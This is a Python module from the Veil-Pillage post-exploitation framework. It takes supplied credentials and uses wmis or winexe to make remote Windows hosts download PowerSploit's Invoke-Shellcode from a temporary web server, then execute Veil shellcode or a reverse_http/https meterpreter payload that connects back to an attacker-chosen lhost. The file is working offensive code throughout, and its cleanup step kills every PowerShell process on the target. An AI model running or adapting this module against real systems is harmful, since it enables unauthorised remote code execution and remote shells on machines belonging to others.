"""

Execute PowerSploit's CodeExecution/Invoke-Shellcode.ps1 module on our host.

We do this by throwing up a temporary web server, hosting the script and using
invoking the downloader launcher on the host.

All cred to the PowerSploit guys !
    https://github.com/mattifestation/PowerSploit/


Module built by @harmj0y

"""

import time, sys

import settings
from lib import messages
from lib import delivery_methods
from lib import helpers

# Veil-Evasion import for shellcode generation
from modules.common import shellcode


class Module:
    
    def __init__(self, targets=None, creds=None, args=None):

        self.name = "Invoke-Shellcode"
        self.description = ("Execute PowerSploit's Invoke-Shellcode module on a host. "
                            "This will invoke a variety of shellcode payloads on the host.")

        # internal list() that holds one or more targets set by the framework
        self.targets = targets

        # internal list() that holds one or more cred tuples set by the framework
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # holder for the argument dictionary passed by the main pillage.py
        # so we can parse command line arguments as necessary
        self.args = args

        # any relevant text to echo to the output file
        self.output = ""

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "trigger_method"    :   ["wmis", "[wmis] or [winexe] for triggering"],
                                    "use_ssl"           :   ["false", "use https for hosting"],
                                    "payload"           :   ["http", "[veil] for shellcode or msf_[http]/[https]"],
                                    "lhost"             :   ["", "lhost for the msfpayload"],
                                    "lport"             :   ["8080", "lport for the msfpayload"]}


    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        trigger_method = self.required_options["trigger_method"][0]
        payloadOption = self.required_options["payload"][0]
        lhost = self.required_options["lhost"][0]
        lport = self.required_options["lport"][0]
        use_ssl = self.required_options["use_ssl"][0]
        
        # sanity check
        if trigger_method.lower() == "smbexec":
            print helpers.color("\n\n [!] Error: smbexec will not work with powershell invocation",warning=True)
            raw_input(" [*] press any key to return: ")
            return ""

        if payloadOption.lower() == "veil":

            payload = "veil/shellcode"

            # nab up some shellcode from Veil-Evasion
            # users can set custom shellcode there
            sc = shellcode.Shellcode()

            # set the payload to use, if specified
            if self.args.msfpayload:
                sc.SetPayload([self.args.msfpayload, self.args.msfoptions])

            # set custom shellcode if specified
            elif self.args.custshell:
                sc.setCustomShellcode(self.args.custshell)

            # generate our shellcode and get it into the correct format
            sc_raw = sc.generate()
            sc_transformed = ",0".join(sc_raw.split("\\"))[1:]

            # re-print the title and module name after shellcode generation (Veil-Evasion trashes this)
            messages.title()
            sys.stdout.write(" [*] Executing module: " + helpers.color(self.name) + "...")

            # command to invoke the appropriate shellcode in the script
            scriptArguments = "Invoke-Shellcode -Force -Shellcode @(%s)" %(sc_transformed)

        elif payloadOption.lower() == "http":
            payload = "windows/meterpreter/reverse_http"
            # command to invoke the appropriate shellcode in the script
            scriptArguments = "Invoke-Shellcode -Payload "+payload+" -Lhost "+lhost+" -Lport "+lport+" -Force"
        elif payloadOption.lower() == "https":
            payload = "windows/meterpreter/reverse_https"
            # command to invoke the appropriate shellcode in the script
            scriptArguments = "Invoke-Shellcode -Payload "+payload+" -Lhost "+lhost+" -Lport "+lport+" -Force"
        else:
            print helpers.color("\n\n [!] Error: payload option "+payloadOption+" invalid, please enter http, or https", warning=True)
            time.sleep(3)
            return ""

        # path to the PowerSploit Invoke-Shellcode.ps1 powershell script
        secondStagePath = settings.VEIL_PILLAGE_PATH+"/data/PowerSploit/Invoke-Shellcode.ps1"
       
        # trigger the powershell download on all targets
        delivery_methods.powershellHostTrigger(self.targets, username, password, secondStagePath, lhost, scriptArguments, trigger_method, ssl=use_ssl)

        for target in self.targets:
            self.output += "[*] Powersploit:Invoke-Shellcode payload="+payload+" lhost="+lhost+" lport="+lport+" triggered using creds '"+username+":"+password+"' on "+target+" using "+trigger_method+"\n"

            # build our cleanup file -> kill all powershell processes
            killCMD = "taskkill /f /im powershell.exe"
            self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+killCMD+"|"+trigger_method+"\n"

